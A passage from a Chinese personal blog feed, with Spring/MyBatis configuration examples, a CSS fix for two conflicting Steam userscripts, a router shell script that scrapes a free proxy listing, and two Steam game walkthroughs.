<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">typeAliases</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 手动 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">typeAlias</span> <span class="attribute">type</span>=<span class="value">"com.test.entity.User"</span> <span class="attribute">alias</span>=<span class="value">"user"</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 自动,以首字母小写的非限定类名来作为它的别名--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">package</span> <span class="attribute">name</span>=<span class="value">"com.test.mapper.UserMapper"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">typeAliases</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<table>
<thead>
<tr>
<th>mapper</th>
<th>特点</th>
</tr>
</thead>
<tbody>
<tr>
<td>resource</td>
<td>xml文件</td>
</tr>
<tr>
<td>class</td>
<td>接口上注解</td>
</tr>
</tbody>
</table>
<h2 id="使用Spring管理Mybatis">使用Spring管理Mybatis</h2><p>这里的管理指的是</p>
<ul>
<li>数据源</li>
<li>sqlSession</li>
<li>Mapper</li>
</ul>
<p>在<em>Spring-context.xml</em>中<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 数据源 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 或者 com.mchange.v2.c3p0.ComboPooledDataSource 什么的--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"dataSource"</span> <span class="attribute">class</span>=<span class="value">"org.springframework.jdbc.datasource.DriverManagerDataSource"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"driverClassName"</span> <span class="attribute">value</span>=<span class="value">"com.mysql.jdbc.Driver"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"url"</span> <span class="attribute">value</span>=<span class="value">"jdbc:mysql://localhost:3306/test"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"username"</span> <span class="attribute">value</span>=<span class="value">"root"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"password"</span> <span class="attribute">value</span>=<span class="value">"toor"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- sqlSession(Factory) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"sqlSessionFactory"</span> <span class="attribute">class</span>=<span class="value">"org.mybatis.spring.SqlSessionFactoryBean"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"dataSource"</span> <span class="attribute">ref</span>=<span class="value">"dataSource"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Mapper --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 手动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"userMapper"</span> <span class="attribute">class</span>=<span class="value">"org.mybatis.spring.mapper.MapperFactoryBean"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"mapperInterface"</span> <span class="attribute">value</span>=<span class="value">"com.test.mapper.UserMapper"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"sqlSessionFactory"</span> <span class="attribute">ref</span>=<span class="value">"sqlSessionFactory"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 自动 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"MapperScannerConfig"</span> <span class="attribute">class</span>=<span class="value">"org.mybatis.spring.mapper.MapperScannerConfigurer"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"basePackage"</span> <span class="attribute">value</span>=<span class="value">"com.test.mapper"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这样搞完后,只需要</p>
<ul>
<li>写好<em>DAO</em>层调数据库的接口,并写好操作数据库的sql语句(xml/注解),自动注入<em>Mapper</em>的配置</li>
<li>在<em>Service</em>层中配置<em>SqlSession</em>类型的变量,即可注入<em>sqlSession</em>,调用<em>DAO</em>层的接口</li>
<li>在<em>Controller</em>层调用<em>Service</em>层的方法,并使得<em>SpringMVC</em>可以传递输入输出数据</li>
<li>Tomcat等Servlet容器在启动之后将特定的数据传递到<em>SpringMVC</em></li>
<li>浏览器将其转换成从Tomcat或其他http服务器获得数据,展示给用户</li>
</ul>
<h2 id="分页">分页</h2><p>使用阿里巴巴的pagehelper即可,有中文文档</p>
<h2 id="一对多,多对一,多对多">一对多,多对一,多对多</h2><p>在实体类中设置某其他实体类变量即可实现多对多的功能</p>
<h2 id="Mybatis_Generator">Mybatis Generator</h2><p><em>maven</em>中添加<em>mybatis-generator-maven-plugin(org.mybatis.generator)</em>插件</p>
<p>可自动生成mybatis所需的各种文件<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="pi">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="doctype">&lt;!DOCTYPE generatorConfiguration PUBLIC</span><br><span class="line">        "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN"</span><br><span class="line">        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd" &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">generatorConfiguration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="title">classPathEntry</span> <span class="attribute">location</span>=<span class="value">"(jdbc驱动路径)"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="title">context</span> <span class="attribute">id</span>=<span class="value">"context"</span> <span class="attribute">targetRuntime</span>=<span class="value">"MyBatis3Simple"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">commentGenerator</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"suppressAllComments"</span> <span class="attribute">value</span>=<span class="value">"false"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"suppressDate"</span> <span class="attribute">value</span>=<span class="value">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">commentGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- jdbc连接信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">jdbcConnection</span> <span class="attribute">userId</span>=<span class="value">""</span> <span class="attribute">password</span>=<span class="value">""</span> <span class="attribute">driverClass</span>=<span class="value">""</span> <span class="attribute">connectionURL</span>=<span class="value">""</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="title">javaTypeResolver</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"forceBigDecimals"</span> <span class="attribute">value</span>=<span class="value">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">javaTypeResolver</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Model构造器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">javaModelGenerator</span> <span class="attribute">targetPackage</span>=<span class="value">""</span> <span class="attribute">targetProject</span>=<span class="value">"."</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"enableSubPackages"</span> <span class="attribute">value</span>=<span class="value">"false"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"trimStrings"</span> <span class="attribute">value</span>=<span class="value">"true"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">javaModelGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- mapper.xml构造器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">sqlMapGenerator</span> <span class="attribute">targetPackage</span>=<span class="value">""</span> <span class="attribute">targetProject</span>=<span class="value">"."</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"enableSubPackages"</span> <span class="attribute">value</span>=<span class="value">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">sqlMapGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- mapper接口构造器 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">javaClientGenerator</span> <span class="attribute">targetPackage</span>=<span class="value">""</span> <span class="attribute">type</span>=<span class="value">"XMLMAPPER"</span> <span class="attribute">targetProject</span>=<span class="value">"."</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"enableSubPackages"</span> <span class="attribute">value</span>=<span class="value">"false"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">javaClientGenerator</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 指定表(table) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">table</span> <span class="attribute">schema</span>=<span class="value">""</span> <span class="attribute">tableName</span>=<span class="value">""</span> <span class="attribute">enableCountByExample</span>=<span class="value">"false"</span> <span class="attribute">enableDeleteByExample</span>=<span class="value">"false"</span></span><br><span class="line">               <span class="attribute">enableSelectByExample</span>=<span class="value">"false"</span> <span class="attribute">enableUpdateByExample</span>=<span class="value">"false"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">context</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="参考链接">参考链接</h1><p>官方文档 😂<br><a href="https://www.cnblogs.com/wuchanming/p/5426746.html" target="_blank" rel="external"></a></p>
<p><a href="http://blog.csdn.net/u010648555/article/details/76371474" target="_blank" rel="external"></a></p>
<p><a href="https://www.ibm.com/developerworks/cn/opensource/os-cn-spring-iocannt/" target="_blank" rel="external">详解 Spring 3.0 基于 Annotation 的依赖注入实现</a></p>
<p><a href="http://wiki.jikexueyuan.com/project/ssh-noob-learning/package.html" target="_blank" rel="external"></a></p>
<p><a href="wiki.jikexueyuan.com/project/spring/aop-with-spring.html">Spring 框架的 AOP - Spring 教程 - 极客学院 Wiki</a></p>
<p><a href="https://www.tianmaying.com/tutorial/spring-mvc-quickstart" target="_blank" rel="external"></a></p>
<p><a href="https://www.cnblogs.com/zhao307/p/5547986.html" target="_blank" rel="external">MyBatis xml 和 dao 层接口组合使用</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="SSM:">SSM:</h1><p>即是<strong>S</strong>pring <strong>S</strong>pringMVC <strong>M</strong>ybatis的开头字母</p>
<h1 id="Spring">Spring</h1><p><img src="https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/htmlsingle/images/spring-overview.png" alt="Spring Framework Runtime"></p>
<p><strong>S</strong>SM里的Spring其实主要常用的是IoC和Aop,还有Test</p>
<ul>
<li>Spring默认的xml配置文件为 <em>applicationContext.xml</em></li>
</ul>
<h2 id="Spring_IoC">Spring IoC</h2><p>中文译名:控制反转/依赖注入,简单来说,即是原来的<code>new xxx();</code>用spring中content的bean代替,实现在构造函数的时候自动注入参数,有三种配置方式:基于xml,基于注解,基于java类,有三种注入方式:构造注入,set注入,工厂注入(不常用).<br>]]>
    
    </summary>
    
      <category term="java" scheme="http://blog.qwerdf.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Steam Web Tools 与 Steam Economy Enhancer 共存]]></title>
    <link href="http://blog.qwerdf.com/2018/01/16/SteamWebToolsAndSteamEconomyEnhancerFix/"/>
    <id>http://blog.qwerdf.com/2018/01/16/SteamWebToolsAndSteamEconomyEnhancerFix/</id>
    <published>2018-01-16T05:04:46.000Z</published>
    <updated>2018-03-30T19:00:12.675Z</updated>
    <content type="html"><![CDATA[<p>steam常用脚本Steam Web Tools和Steam Economy Enhancer一起使用时,库存页面显示有冲突.此时仅需要将<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"<span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"><span class="class">.checkedForSend</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#366836</span><span class="important">!important</span></span></span></span>&#125;<span class="class">.itemcount</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#292929</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#FFF</span></span></span>;<span class="rule"><span class="attribute">font-weight</span>:<span class="value"><span class="number">700</span></span></span>;<span class="rule"><span class="attribute">position</span>:<span class="value">absolute</span></span>;<span class="rule"><span class="attribute">right</span>:<span class="value"><span class="number">0</span></span></span>;<span class="rule"><span class="attribute">top</span>:<span class="value"><span class="number">0</span></span></span></span>&#125;<span class="class">.swt_icon</span><span class="rules">&#123;<span class="rule"><span class="attribute">position</span>:<span class="value">absolute</span></span>;<span class="rule"><span class="attribute">top</span>:<span class="value"><span class="number">0</span></span></span>;<span class="rule"><span class="attribute">left</span>:<span class="value"><span class="number">0</span></span></span></span>&#125;<span class="class">.swt_icon-st</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#CF6A32</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#fff</span></span></span></span>&#125;<span class="class">.swt_icon-t</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#FDEC14</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#000</span></span></span></span>&#125;<span class="id">#inventory_logos</span><span class="rules">&#123;<span class="rule"><span class="attribute">display</span>:<span class="value">none</span></span></span>&#125;<span class="class">.swt_hidden</span><span class="rules">&#123;<span class="rule"><span class="attribute">display</span>:<span class="value">none</span></span></span>&#125;</span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>"</span><br></pre></td></tr></table></figure></p>
<p>修改为<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'<span class="tag">&lt;<span class="title">style</span>&gt;</span><span class="css"><span class="class">.checkedForSend</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#366836</span><span class="important">!important</span></span></span></span>&#125;<span class="class">.itemcount</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#292929</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#FFF</span></span></span>;<span class="rule"><span class="attribute">font-weight</span>:<span class="value"><span class="number">700</span></span></span>;<span class="rule"><span class="attribute">position</span>:<span class="value">absolute</span></span>;<span class="rule"><span class="attribute">right</span>:<span class="value"><span class="number">0</span></span></span>;<span class="rule"><span class="attribute">bottom</span>:<span class="value"><span class="number">0</span></span></span></span>&#125;<span class="class">.swt_icon</span><span class="rules">&#123;<span class="rule"><span class="attribute">position</span>:<span class="value">absolute</span></span>;<span class="rule"><span class="attribute">top</span>:<span class="value"><span class="number">0</span></span></span>;<span class="rule"><span class="attribute">left</span>:<span class="value"><span class="number">0</span></span></span></span>&#125;<span class="class">.swt_icon-st</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#CF6A32</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#fff</span></span></span></span>&#125;<span class="class">.swt_icon-t</span><span class="rules">&#123;<span class="rule"><span class="attribute">background</span>:<span class="value"><span class="hexcolor">#FDEC14</span></span></span>;<span class="rule"><span class="attribute">color</span>:<span class="value"><span class="hexcolor">#000</span></span></span></span>&#125;<span class="id">#inventory_logos</span><span class="rules">&#123;&#125;</span><span class="class">.swt_hidden</span><span class="rules">&#123;<span class="rule"><span class="attribute">display</span>:<span class="value">none</span></span></span>&#125;</span><span class="tag">&lt;/<span class="title">style</span>&gt;</span>'</span><br></pre></td></tr></table></figure></p>
<p>即可</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>steam常用脚本Steam Web Tools和Steam Economy Enhancer一起使用时,库存页面显示有冲突.此时仅需要将<br><figure class="highlight html"><table><tr><td class="gutter"><pr]]>
    </summary>
    
      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
    
      <category term="fix" scheme="http://blog.qwerdf.com/tags/fix/"/>
    
      <category term="javascript" scheme="http://blog.qwerdf.com/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[基于sh的简单爬虫]]></title>
    <link href="http://blog.qwerdf.com/2017/07/20/simple-spider-with-bash/"/>
    <id>http://blog.qwerdf.com/2017/07/20/simple-spider-with-bash/</id>
    <published>2017-07-20T14:31:46.000Z</published>
    <updated>2018-03-30T18:59:16.469Z</updated>
    <content type="html"><![CDATA[<p>对于我这种买不起vps的穷逼来说,免费$$不失为一个很好的解决方案.然而大部分在飞机场里的免费$$都是隔一段时间变更一下端口和密码.</p>
<p>爬虫什么的用py做的比较多一点,然而在路由器上那点可怜的空间并不足以装上py.遂查了资料上了shell的爬虫.<br><a id="more"></a><br>多话不说.</p>
<pre><code>wget -t <span class="number">1</span> -T <span class="number">5</span> -q -O /tmp/auto_change_ss_xz https:<span class="comment">//xsjs.yhyhd.org/free-ss/</span>
select=`tr -cd <span class="number">1</span>-<span class="number">3</span> &lt;/dev/urandom | head -c <span class="number">1</span>`
xhead='ss-body'
xend='modal-footer'
sed -i -e <span class="string">"1,/$xhead/d"</span> -e <span class="string">"/$xend/,$ d"</span> -e <span class="attribute">'s</span>/&amp;nbsp;/\n/g' /tmp/auto_change_ss_xz
ss_server=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-9))p"</span> -n|awk -F '<span class="annotation">[&lt;&gt;]</span>' '{print $<span class="number">3</span>}')
ss_server_port=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-7))p"</span> -n|awk -F '<span class="annotation">[&lt;&gt;]</span>' '{print $<span class="number">3</span>}')
ss_method=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-5))p"</span> -n|awk -F '<span class="annotation">[&lt;&gt;]</span>' '{print $<span class="number">3</span>}')
ss_key=$(cat /tmp/auto_change_ss_xz|sed <span class="string">"$(($select*13-3))p"</span> -n|awk -F '<span class="annotation">[&lt;&gt;]</span>' '{print $<span class="number">3</span>}')
</code></pre><p>核心代码就是这么多,其中遇到的几个问题:</p>
<ol>
<li>sed/awk/grep就最后一个用过,前两个几乎没有用过,查了半天文档</li>
<li>路由器上的shell不支持 <code>&lt;&lt;&lt;</code>,最后用<code>$(...)</code>来代替了</li>
<li>wget默认重试和超时非常坑,在默认直接 <code>wget Url</code> 的情况下会默认重试 <code>900s*20次</code> .</li>
</ol>
]]></content>
    <summary type="html">
    <![CDATA[<p>对于我这种买不起vps的穷逼来说,免费$$不失为一个很好的解决方案.然而大部分在飞机场里的免费$$都是隔一段时间变更一下端口和密码.</p>
<p>爬虫什么的用py做的比较多一点,然而在路由器上那点可怜的空间并不足以装上py.遂查了资料上了shell的爬虫.<br>]]>
    
    </summary>
    
      <category term="linux" scheme="http://blog.qwerdf.com/tags/linux/"/>
    
      <category term="shell" scheme="http://blog.qwerdf.com/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Socxel | Pixel Soccer]]></title>
    <link href="http://blog.qwerdf.com/2017/07/19/Socxel-Pixel-Soccer/"/>
    <id>http://blog.qwerdf.com/2017/07/19/Socxel-Pixel-Soccer/</id>
    <published>2017-07-19T06:41:11.000Z</published>
    <updated>2018-03-30T19:00:26.851Z</updated>
    <content type="html"><![CDATA[<p>今天随机到的游戏是Socxel | Pixel Soccer</p>
<p><iframe src="https://store.steampowered.com/widget/586190/" style="border:none;height:190px;width:100%;max-width:646px;"></iframe><br>开发商是 BUG-Studio 😄 这名字好啊.<br><a id="more"></a></p>
<h2 id="0x01_简单游玩">0x01 简单游玩</h2><p>游戏支持最大4人同时在一台电脑上游戏.</p>
<p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958712904374506/CDFF35FB840FE8005A79B9033A4064DBA3660AB0/?pic1.jpg" alt="进入游戏" title="进入游戏"></p>
<p>下面可以更改操控键位设置,并不是常见的wasd控制方向什么的,而是…</p>
<p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958712904376477/21F5B11383251C1780C429311A7057A4EE1E2DF3/?pic2.jpg" alt="啥都不做都赢了" title="啥都不做居然还能赢了"></p>
<p>btw,开了吧<code>1 vs AI</code>,摸索了半天都不知道用什么操控.然而我居然赢了…电脑经常把球踢进自己球门.所以这破游戏啥都不动只要是欧皇,对电脑怎么都赢了.</p>
<p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958712904378919/8B1A1F937B7690D771B009D8417FD8887E57943A/?pic3.jpg" alt="按键" title="按键提示"></p>
<p>这游戏丧心病狂的只用一个按键(图中有提示)来操作,如果你不按任何按键的话,游戏内的任务会在原地转圈;而当你按下游戏一开始提示的按键的话,游戏中的人物将向前冲,并改变转向.</p>
<h2 id="0x02_意外发现">0x02 意外发现</h2><p>在游戏中准备用f12截图,却意外的发现打开了<code>Devtools</code> ,难道这游戏直接是用HTML5开发的嘛?</p>
<p>带着疑问大概看了下代码,发现了个关键字<code>c2canvasdiv</code> ,Google了下发现是一个游戏引擎 <a href="https://www.scirra.com" target="_blank" rel="external">Construct 2</a> . </p>
<p><code>Construct</code>是一个HTML5的游戏引擎,类似于<code>GameMaker</code>,但是相比感觉前者更强大一些.类似的我只知道unity3d可以导出为web格式,但是前两者拥有所见即所得的简单编辑模式,只需要动动手拖动一下就可以很轻易的制作一些简单的游戏.简单易用的程度也表现在,我甚至在网上找到了面向14岁+开展的培训班.</p>
<p>顺便一提,<a href="http://store.steampowered.com/app/227240/" target="_blank" rel="external">Construct 2</a>居然也在steam商店上架了.</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>今天随机到的游戏是Socxel | Pixel Soccer</p>
<p><iframe src="https://store.steampowered.com/widget/586190/" style="border:none;height:190px;width:100%;max-width:646px;"></iframe><br>开发商是 BUG-Studio 😄 这名字好啊.<br>]]>
    
    </summary>
    
      <category term="Steam" scheme="http://blog.qwerdf.com/tags/Steam/"/>
    
      <category term="game" scheme="http://blog.qwerdf.com/tags/game/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[The Next Door]]></title>
    <link href="http://blog.qwerdf.com/2017/07/17/The-Next-Door/"/>
    <id>http://blog.qwerdf.com/2017/07/17/The-Next-Door/</id>
    <published>2017-07-16T16:35:48.000Z</published>
    <updated>2018-03-30T19:00:43.901Z</updated>
    <content type="html"><![CDATA[<p>今天随机到的游戏是”The Next Door”.</p>
<p><iframe src="https://store.steampowered.com/widget/447850/" style="border:none;height:190px;width:100%;max-width:646px;"></iframe><br>不不不,不是你想的那个意♂思,和”Boy♂Next♂Door”的那个一点关系都没有.此游戏是一个融合了宗教元素的正常向解密游戏,只是我第一次玩的时候直白的xx画面吓得我赶紧把游戏关掉了而已.<br><a id="more"></a></p>
<blockquote>
<p>tips:按住shift打开游戏可以调整画面设置.</p>
</blockquote>
<h2 id="0x00_before:">0x00 before:</h2><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716407373/0694D75E531745E578EDC5DD65AA42A4B2239F50/?pic0,jpg" alt="pic0"><br>开局点门</p>
<blockquote>
<p>-What is your greatest wish?<br>-啥是你最大的愿望?<br>-my desire is to be extraordinary<br>-我的愿望是成为伟大的人<br>-how will you do that?<br>-你会怎么做?<br>-go up<br>-向上</p>
</blockquote>
<p>画面一转,一个门在一个看似女士的背景上的不可描述的部位,玩家与门互动后画风一变:变成了小蝌蚪找球球.<br><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716400857/8689F802B18B8FDD6BC99CBBAE3A4E29553BE5B0/?pic1.jpg" alt="test"><br>此处球球指代月球.</p>
<h2 id="0x01_Ladyrinth">0x01 Ladyrinth</h2><p>到了一个房子</p>
<p>书架上有纸条,桌面上有一个手机,左手边有个电视.头顶有数字盘,房间拐角大大的”E”</p>
<p>按E后脚下变成了R,周围的物品一下就变了.</p>
<p>后来看到脚下有数字盘发现是到了天花板上</p>
<p>数字盘可以拨动,为手机内的数字.正确后窗户外面会出现一个长长的独木桥.</p>
<p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716401664/A40E72D614D3611C7A69B127E2A8829251138787/?pic2.jpg" alt="pic2"></p>
<p>出窗后有条路,走上去有汽车声.</p>
<p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716401950/4CD77568503B0565F101773347CB43CED4ECE6C4/?pic3.jpg" alt="pic3"></p>
<p>回头发现房子上方有和纸条一样的图形,即:<strong>卡巴拉</strong>生命之树</p>
<p>走到桥的尽头,根据地面提示按”Q”后,进入下一个部分,即是走迷宫…用贴边大法完全没有难度…</p>
<h2 id="0x02_the_equilibrium">0x02 the equilibrium</h2><blockquote>
<p>hello i am your limits. keep your sanity.<br>你好,我是你的极限(?),请保持清醒.</p>
<p>keep your sanity .no trespassing<br>保持清醒!这里没有非法入侵(?).</p>
<p>this is a revolution of the mind<br>这是一场心灵的革命!</p>
</blockquote>
<p>沿着路线转了两个弯后发现:WTF,这不是 <a href="http://store.steampowered.com/app/221910/" target="_blank" rel="external">史丹利的预言</a> 的场景嘛…</p>
<p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716402703/1BADDB35A2583A84CB772008C2D3F5DACFD70957/?pic4.jpg" alt="pic4"></p>
<p>经过一段崎岖的路后发现了下一个需要解密的地方,需要将上方与下方的对应即可.</p>
<h2 id="0x03_the_box">0x03 the box</h2><p>开局在一个房间里,墙上有画,有表,有摄像头.地面上有电视,显示的是摄像头里的画面.<br>此关即与电视互动,开门即可</p>
<h2 id="0x04_out_of_the_box">0x04 out of the box</h2><p>此关即与电视互动,一路爬楼梯,开门即可.</p>
<h2 id="0x05_illuminated">0x05 illuminated</h2><p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716403567/3957747B2C362092D1F820655CB06E4F23D3DE70/?pic5.jpg" alt="pic5"><br>照图选择即可,此处的图案与塔罗牌有关,而塔罗牌也与<strong>卡巴拉</strong>有关.</p>
<p>跳入大洞后前方既是开头的”月亮”.</p>
<p><img src="https://steamuserimages-a.akamaihd.net/ugc/836958517716438486/55AF5C6A80344042E389AB8714E7F077EE62AFC4/?pic6.jpg" alt="pic6"></p>
<blockquote>
<p>the true name of God<br>GOWD</p>
</blockquote>
<p>赶紧去查了下…</p>
<blockquote>
